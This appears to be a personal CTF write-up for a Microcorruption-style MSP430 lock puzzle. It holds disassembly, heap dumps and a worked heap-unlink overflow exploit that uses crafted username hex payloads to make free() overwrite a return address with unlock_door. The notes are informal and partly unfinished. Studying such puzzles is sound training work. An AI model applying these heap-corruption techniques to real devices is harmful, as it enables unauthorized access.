# TL;DR - Its possible to use the first free for arbitrari write, need to understand to free function better

463a <login>
463a:  0b12           push	r11
463c:  0a12           push	r10
463e:  3f40 1000      mov	#0x10, r15
4642:  b012 6444      call	#0x4464 <malloc> // Allocate 0x10 (16)
4646:  0a4f           mov	r15, r10		 // Save address in r10 (0x240e)
4648:  3f40 1000      mov	#0x10, r15
464c:  b012 6444      call	#0x4464 <malloc> // Allocate 0x10 (16)
4650:  0b4f           mov	r15, r11		 // Save address in r11 (0x2424)
4652:  3f40 9a45      mov	#0x459a, r15
4656:  b012 1a47      call	#0x471a <puts>   "Enter your username and password to continue."
465a:  3f40 c845      mov	#0x45c8, r15
465e:  b012 1a47      call	#0x471a <puts>   "Username >> "
4662:  3e40 3000      mov	#0x30, r14
4666:  0f4a           mov	r10, r15
4668:  b012 0a47      call	#0x470a <getsn>  // Read username 0x30 (48) to first allocation
466c:  3f40 c845      mov	#0x45c8, r15
4670:  b012 1a47      call	#0x471a <puts>   "Username >> "
4674:  3f40 d445      mov	#0x45d4, r15
4678:  b012 1a47      call	#0x471a <puts>   "(Remember: passwords are between 8 and 16 characters.)"
467c:  3e40 3000      mov	#0x30, r14
4680:  0f4b           mov	r11, r15
4682:  b012 0a47      call	#0x470a <getsn>  // Read password 0x30 (48) to seconed allocation
4686:  0f4b           mov	r11, r15
4688:  b012 7045      call	#0x4570 <test_password_valid> // Check with HSM1
468c:  0f93           tst	r15
468e:  0524           jz	$+0xc <login+0x60> -> 0x469a
4690:  b012 6445      call	#0x4564 <unlock_door>
4694:  3f40 0b46      mov	#0x460b, r15
4698:  023c           jmp	$+0x6 <login+0x64> -> jmp to 0x469e
469a:  3f40 1b46      mov	#0x461b, r15	 "Access granted."
469e:  b012 1a47      call	#0x471a <puts>
46a2:  0f4b           mov	r11, r15
46a4:  b012 0845      call	#0x4508 <free>   // Free seconed allocation
46a8:  0f4a           mov	r10, r15
46aa:  b012 0845      call	#0x4508 <free>   // Free first allocation
46ae:  3a41           pop	r10
46b0:  3b41           pop	r11
46b2:  3041           ret

4570 <test_password_valid>
4570:  0412           push	r4
4572:  0441           mov	sp, r4
4574:  2453           incd	r4
4576:  2183           decd	sp
4578:  c443 fcff      mov.b	#0x0, -0x4(r4)
457c:  3e40 fcff      mov	#0xfffc, r14
4580:  0e54           add	r4, r14
4582:  0e12           push	r14
4584:  0f12           push	r15
4586:  3012 7d00      push	#0x7d	// HSM1 check password
458a:  b012 b646      call	#0x46b6 <INT> 
458e:  5f44 fcff      mov.b	-0x4(r4), r15
4592:  8f11           sxt	r15
4594:  3152           add	#0x8, sp
4596:  3441           pop	r4
4598:  3041           ret


###### Solution ######
1. Set 'Is Active' bit in Len to 0
2. If Prev is NOT active:
	1) (+4) prev_len += current_len + 0x06 (header_len)
	2) (+2) prev_next = current_next
	3) (+0) next_prev = current_prev
	4) current = prev
3. If Next is NOT active:
	1) (+4) current_len += next_len + 0x06 (header_len)
	2) (+2) current_next = next_next
	3) (+0) next_prev = current_addr (Relevant only in case the first if accure to)

We can overwrite 4 bytes the following way:
	overflow to the heap header:
		the wanted address to overwrite
		address pointed to value_to_overwrite len_2
		len_1
	after the function the address to overwrite will the the value given
	and and word after it will be hex(original_valie + 0x06 + len_1 + 0x06 + len_2)
	## Pay attention the len_2 should an odd value, we can make it odd by changing len_1 value which it does not metter if it's odd or not

We will use only the first 2 byte and overwrite the address using when calling to free to be the address of the unlock function
Username: 4242 6445 3c23 4242 4242 4242 4242 4242 aa46 0e24 1011
Password: 4141

Before free
	46a0: 1a47 0f4b b012 0845 0f4a b012 0845 3a41   .G.K...E.J...E:A
Before second jump
	hex(0x4508 + 0x06 + 0x1010) = 551e
	46a0: 1a47 0f4b b012 0845 0f4a dead 1e55 3a41   .G.K...E.J...U:A
	46a0: 1a47 0f4b b012 0845 0f4a 0e24 1e55 3a41   .G.K...E.J.$.U:A
After seconed jump
	dead is not a real address so the current next overrided with 0000
	46a0: 1a47 0f4b b012 0845 0f4a 0000 2455 3a41   .G.K...E.J..$U:A
	46a0: 1a47 0f4b b012 0845 0f4a 4242 6697 3a41   .G.K...E.JBBf.:A

hex(0x4508 + 0x06 + 0x1010 + 0x06 + 0x0f21)
46a0: 1a47 0f4b b012 0845 0f4a 4444 6a9b 3a41   .G.K...E.JDDj.:A
46a0: 1a47 0f4b b012 0845 0f4a b012 0e24 5051   .G.K...E.J...$PQ


###### /Solution ######

# Before malloc
2400: 0824 0010 0100 0000 0000 0000 0000 0000   .$..............
2410: 0000 0000 0000 0000 0000 0000 0000 0000   ................

# After first malloc (return 0x240e)
                          -Alloc Header-
     Base Header          Prev Next Len
2400: 0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
                                         Prev
2410: 0000 0000 0000 0000 0000 0000 0000 0824   ...............$
      Next Len (Circular)
2420: 0824 c81f 0000 0000 0000 0000 0000 0000   .$..............
2430: 0000 0000 0000 0000 0000 0000 0000 0000   ................

# After Second malloc (return 0x2424)
2400: 0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
                                         Prev
2410: 0000 0000 0000 0000 0000 0000 0000 0824   ...............$
      Next Len
2420: 3424 2100 0000 0000 0000 0000 0000 0000   4$!.............
                Prev Next Len (Circular)
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........

current_len = 0x21 -- not active --> 0x20 -- + 0x06 + 0x1f9c --> 0x1fc2
current_next = 0x2434 -- next next --> 2408
next_prev = 241e -- current addr --> 241e

Start position
	first_prev
	first_next
	first_len
	# Can be overflow
	second_prev
	second_next
	second_len
	# Can be overflow
	leftover_prev
	leftover_next
	leftover_len

After first free (We can overflow the second_prev address to point to "not active" header)
	first_prev 
	first_next
	first_len
	# Can be overflow
	second_prev
	leftover_next
	second_len + 0x06 + leftover_len
	# Can be overflow
	leftover_prev
	leftover_next
	leftover_len

After seconed free
	first_prev
	first_next
	first_len
	# Can be overflow
	second_prev
	leftover_next
	second_len + 0x06 + leftover_len
	# Can be overflow
	leftover_prev
	leftover_next
	leftover_len

# After first free (zeroed string)
2400: 0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
2410: 0000 0000 0000 0000 0000 0000 0000 0824   ...............$
2420: 0824 c21f 0000 0000 0000 0000 0000 0000   .$..............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........

# After second free (zeroed string)
2400: 0824 0010 0000 0000 0824 0824 0e20 0000   .$.......$.$. ..
2410: 0000 0000 0000 0000 0000 0000 0000 0824   ...............$
2420: 0824 c21f 0000 0000 0000 0000 0000 0000   .$..............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........

# Free algoritem
1. Set 'Is Active' bit in Len to 0
2. If Prev is NOT active:
	1) (+4) prev_len += current_len + 0x06 (header_len)
	2) (+2) prev_next = current_next
	3) (+0) next_prev = current_prev    
3. If Next is NOT active:
	1) (+4) current_len += next_len + 0x06 (header_len)
	2) (+2) current_next = next_next
	3) (+0) next_prev = current_addr (Relevant only in case the first if accure to)

# Len requested in r15
# Heap general header is size of 0x08
# Each allocattion also have header of 0x06
	Prev allocation (Header start)
	Next allocation (Header start)
	Current Len - last bit is "Is Active Allocation"
# The heap is circular linked list, the last window point to the first one with the remaining size

# Conclusion
First free enter the seconed if
Seconed free enter both if

Using username I can control the prev address of the first allocation (and make sure its not active)
This way I can write to this address arbitrary data
I can write to stack ret the unlock_door (6445)
The password is not very usefull (just should to not destroy the secnoed free)

Username: '4141 ' * 0x08 + '46a8 dead 1010'
	4141 4141 4141 4141 4141 4141 4141 4141 9843 9046 2222
	4141 4141 4141 4141 4141 4141 4141 4141 9843 6445 2222
Password: 4141

# Before free
46a0: 1a47 0f4b b012 0845 0f4a b012 0845 3a41   .G.K...E.J...E:A
# After free
46a0: 1a47 0f4b b012 0845 0f4a 3041 4296 3a41   .G.K...E.J0AB.:A (1010)
46a0: 1a47 0f4b b012 0845 0f4a 3041 4297 3a41   .G.K...E.J0AB.:A (1111)
46a0: 1a47 0f4b b012 0845 0f4a 3041 54a8 3a41   .G.K...E.J0AT.:A (2222)
46a0: 1a47 0f4b b012 0845 0f4a 9046 3067 3a41   .G.K...E.J.F0g:A


46b2: a846
46aa: 3041
46ac: 0845 -> 4296


I can overwrite the seconed and third headers
Seconed header is usefull because I can edit the prev pointer.
The problem with editing the prev point of the secones is that the first pointer is active

Password: '4141 ' * 0x08 + 
1. First free -> menipulate seconed free to write to aribtrary 4 bytes location
2. Second free -> overwrite the stack with '#0x7f' and ret to <INT>

Username: 'B' * 0x16
Password: 'D' * 0x16
# After first free
4240: 0000 4242 4242 9684


























############################ Useless ############################
# Allocation start at r15
4508 <free>
4508:  0b12           push	r11
450a:  3f50 faff      add	#0xfffa, r15 // r15 = r15 - 0x06
# Allocation headers start (Prev addr) at r15

# Set len "Is Active" to 0 - len is 0x4(r15)
	r13 store current len
450e:  1d4f 0400      mov	0x4(r15), r13
4512:  3df0 feff      and	#0xfffe, r13
4516:  8f4d 0400      mov	r13, 0x4(r15)

# if prev is active allocation - r14 is the previos header start
	r12 store previos len
451a:  2e4f           mov	@r15, r14
451c:  1c4e 0400      mov	0x4(r14), r12
4520:  1cb3           bit	#0x1, r12
4522:  0d20           jnz	$+0x1c <free+0x36>

# - False (Prev not active) (First free -> skeep, Second free -> enter)
	Add the header len + current len to previos len
.	4524:  3c50 0600      add	#0x6, r12
.	4528:  0c5d           add	r13, r12
.	452a:  8e4c 0400      mov	r12, 0x4(r14)

	Move the current next to the previos next and store in r13
.	452e:  9e4f 0200 0200 mov	0x2(r15), 0x2(r14)
.	4534:  1d4f 0200      mov	0x2(r15), r13

	Move the current previos to the next previos
.	4538:  8d4e 0000      mov	r14, 0x0(r13)

	Move Prev addr to r15
.	453c:  2f4f           mov	@r15, r15

# if next is active allocation -- r15 is current or the prev
453e:  1e4f 0200      mov	0x2(r15), r14
4542:  1d4e 0400      mov	0x4(r14), r13
4546:  1db3           bit	#0x1, r13
4548:  0b20           jnz	$+0x18 <free+0x58>

# - False (Prev not active) (Both free -> enter)
	Add header len + current len to current len
.	454a:  1d5f 0400      add	0x4(r15), r13
.	454e:  3d50 0600      add	#0x6, r13
.	4552:  8f4d 0400      mov	r13, 0x4(r15)

	Move next next to current next
.	4556:  9f4e 0200 0200 mov	0x2(r14), 0x2(r15)

	Move current addr to next prev
.	455c:  8e4f 0000      mov	r15, 0x0(r14)

4560:  3b41           pop	r11
4562:  3041           ret

# Len requested in r15
# Heap general header is size of 0x08
# Each allocattion also have header of 0x06
4464 <malloc>
4464:  0b12           push	r11
4466:  c293 0424      tst.b	&0x2404                // Is first allocation
446a:  0f24           jz	$+0x20 <malloc+0x26>   -> 0x448a NotFirstAlloc
# FirstAlloc
446c:  1e42 0024      mov	&0x2400, r14           // 0x2400 = 2408 -> r14=0x2408
4470:  8e4e 0000      mov	r14, 0x0(r14)          // 0x2408 = 2408
4474:  8e4e 0200      mov	r14, 0x2(r14)          // 0x240a = 2408
4478:  1d42 0224      mov	&0x2402, r13           // 0x2402 = 1000 -> r13=0x1000
447c:  3d50 faff      add	#0xfffa, r13           // r13 -= 0x06 -> r13 = 0x0ffa
4480:  0d5d           add	r13, r13			   // r13 += r13 -> r13 = 1ff4
4482:  8e4d 0400      mov	r13, 0x4(r14)          // 0x240c = 0x1ff4
4486:  c243 0424      mov.b	#0x0, &0x2404          // 0x2404 = 0 (Simbol that first chunk allocated)
# NotFirstAlloc
448a:  1b42 0024      mov	&0x2400, r11
448e:  0e4b           mov	r11, r14
4490:  1d4e 0400      mov	0x4(r14), r13
4494:  1db3           bit	#0x1, r13
4496:  2820           jnz	$+0x52 <malloc+0x84>   -> 0x44e8
4498:  0c4d           mov	r13, r12
449a:  12c3           clrc
449c:  0c10           rrc	r12
449e:  0c9f           cmp	r15, r12
44a0:  2338           jl	$+0x48 <malloc+0x84>   -> 0x44e8
44a2:  0b4f           mov	r15, r11
44a4:  3b50 0600      add	#0x6, r11
44a8:  0c9b           cmp	r11, r12
44aa:  042c           jc	$+0xa <malloc+0x50>    -> 0x44b4
44ac:  1dd3           bis	#0x1, r13
44ae:  8e4d 0400      mov	r13, 0x4(r14)
44b2:  163c           jmp	$+0x2e <malloc+0x7c>   -> 0x44e0

44b4:  0d4f           mov	r15, r13
44b6:  0d5d           add	r13, r13
44b8:  1dd3           bis	#0x1, r13
44ba:  8e4d 0400      mov	r13, 0x4(r14)
44be:  0d4e           mov	r14, r13
44c0:  3d50 0600      add	#0x6, r13
44c4:  0d5f           add	r15, r13
44c6:  8d4e 0000      mov	r14, 0x0(r13)
44ca:  9d4e 0200 0200 mov	0x2(r14), 0x2(r13)
44d0:  0c8f           sub	r15, r12
44d2:  3c50 faff      add	#0xfffa, r12
44d6:  0c5c           add	r12, r12
44d8:  8d4c 0400      mov	r12, 0x4(r13)
44dc:  8e4d 0200      mov	r13, 0x2(r14)

44e0:  0f4e           mov	r14, r15
44e2:  3f50 0600      add	#0x6, r15
44e6:  0e3c           jmp	$+0x1e <malloc+0xa0>    -> 0x4504
# Probably some failed scenerio
44e8:  0d4e           mov	r14, r13
44ea:  1e4e 0200      mov	0x2(r14), r14
44ee:  0e9d           cmp	r13, r14
44f0:  0228           jnc	$+0x6 <malloc+0x92>
44f2:  0e9b           cmp	r11, r14
44f4:  cd23           jnz	$-0x64 <malloc+0x2c>
44f6:  3f40 4a44      mov	#0x444a "Heap exausted; aborting.", r15
44fa:  b012 1a47      call	#0x471a <puts>
44fe:  3040 4044      br	#0x4440 <__stop_progExec__>
4502:  0f43           clr	r15

4504:  3b41           pop	r11
4506:  3041           ret


